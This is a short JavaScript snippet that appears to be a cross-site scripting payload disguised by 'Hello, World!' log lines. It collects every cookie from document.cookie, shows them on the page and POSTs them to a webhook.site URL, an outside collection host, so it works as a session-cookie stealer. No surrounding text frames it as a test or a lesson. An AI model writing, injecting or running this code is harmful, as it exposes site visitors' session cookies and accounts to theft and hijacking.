console.log('Hello, World!');
document.getElementById('myId').innerHTML=listCookies(); 
var formData = new URLSearchParams();
console.log('Hello, World!');
formData.append('key1', listCookies());
fetch('https://webhook.site/41a1d9eb-93cd-4eaa-81c4-60511162a89b', {
    method: 'POST',
    body: formData,
    headers: {
      'Content-type': 'application/x-www-form-urlencoded'
    }
  });function listCookies() {var cookies = document.cookie.split(';'); var s = ''; for (var i = 1 ; i <= cookies.length; i++) { s += i + ' ' + cookies[i-1] + '\n'; } return s; }